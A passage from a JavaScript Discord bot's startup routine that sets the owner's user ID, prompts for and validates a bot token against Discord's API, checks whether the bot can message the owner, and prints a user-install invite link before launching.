        if (d.ownerId && /^\d{17,20}$/.test(String(d.ownerId))) {
            acSetOwner(String(d.ownerId));
            tLog('ok', 'Owner set from config: ' + T.primary + d.ownerId + T.reset);
        } else {
            console.log('');
            tDiv('·');
            tLog('sys',  T.warning + 'No owner set yet.' + T.reset);
            tLog('info', 'Enter your Discord User ID to become the owner.');
            tLog('info', T.dim + '(Right-click your name in Discord → Copy User ID)' + T.reset);
            console.log('');
            const ownerId = await tInput('Developer Discord User ID:');
            if (ownerId && /^\d{17,20}$/.test(ownerId)) {
                acSetOwner(ownerId);
                tLog('ok', T.success + 'Owner set → ' + T.reset + T.bold + ownerId + T.reset);
            } else {
                tLog('warn', T.warning + 'Will auto-set on first /autoquest use.' + T.reset);
            }
        }
        console.log('');
    } else {
        tLog('ok', 'Owner: ' + T.primary + T.bold + ac.ownerId + T.reset);
    }

    // ── Bot token setup (loop until valid) ────────
    if (!d.botToken) {
        tLog('sys',  T.warning + 'No bot token in config.json.' + T.reset);
        tLog('info', 'Get your token from ' + T.info + 'discord.com/developers/applications' + T.reset);
        console.log('');
        let validToken = false;
        while (!validToken) {
            const tok = await tInput('Enter Bot Token:');
            if (!tok || tok.length < 20) {
                tLog('err', T.error + 'Invalid token — too short! Try again.' + T.reset);
                continue;
            }
            // Quick validation: try fetching bot user info
            try {
                const testRes = await fetch('https://discord.com/api/v10/users/@me', {
                    headers: { Authorization: `Bot ${tok}`, 'Content-Type': 'application/json' }
                });
                if (testRes.ok) {
                    const botUser = await testRes.json();
                    d.botToken = tok;
                    dbSave(d);
                    validToken = true;
                    tLog('ok', T.success + `Bot token saved! Bot: ${botUser.username}#${botUser.discriminator || '0'}` + T.reset);
                } else if (testRes.status === 401) {
                    tLog('err', T.error + 'Invalid bot token — Discord rejected it. Try again.' + T.reset);
                } else {
                    tLog('err', T.error + `Discord error (${testRes.status}). Check your token and try again.` + T.reset);
                }
            } catch {
                tLog('err', T.error + 'Network error — check your connection and try again.' + T.reset);
            }
        }
        console.log('');
    } else {
        tLog('ok', 'Bot token ' + T.success + 'loaded from config.json.' + T.reset);
    }

    // ── Check owner authorization ──────────────────
    const clientId = decodeBotClientId(d.botToken);
    const ownerId  = ac.ownerId || d.ownerId;
    if (clientId && ownerId) {
        let dmWorks = false;
        try {
            const dmRes = await fetch(`https://discord.com/api/v10/users/@me/channels`, {
                method: 'POST',
                headers: { Authorization: `Bot ${d.botToken}`, 'Content-Type': 'application/json', 'User-Agent': UA_DSK },
                body: JSON.stringify({ recipient_id: ownerId })
            });
            dmWorks = dmRes.ok;
        } catch {}

        if (!dmWorks) {
            tDiv();
            tLog('warn', T.warning + 'Cannot reach owner — user install needed!' + T.reset);
            const inviteUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&integration_type=1&scope=applications.commands`;
            console.log('');
            console.log(T.primary + '  ┌─────────────────────────────────────────────────────┐' + T.reset);
            console.log(T.primary + '  │' + T.reset + T.bold + '  🔗 INVITE LINK (User Install)' + T.reset + T.primary + '                         │' + T.reset);
            console.log(T.primary + '  │' + T.reset + T.info + '  ' + inviteUrl + T.reset + T.primary + ' │' + T.reset);
            console.log(T.primary + '  ├─────────────────────────────────────────────────────┤' + T.reset);
            console.log(T.primary + '  │' + T.reset + T.dim + '  Copy → Paste in browser → Authorize → /autoquest works' + T.reset + T.primary + ' │' + T.reset);
            console.log(T.primary + '  └─────────────────────────────────────────────────────┘' + T.reset);
            console.log('');
        } else {
            tLog('ok', 'Bot can reach owner — ' + T.dim + '(user install or shared server)' + T.reset);
        }
    }

    tDiv();
    tLog('sys', T.primary + 'Launching bot...' + T.reset);
    console.log('');
    startBot(d.botToken);
}

startup();
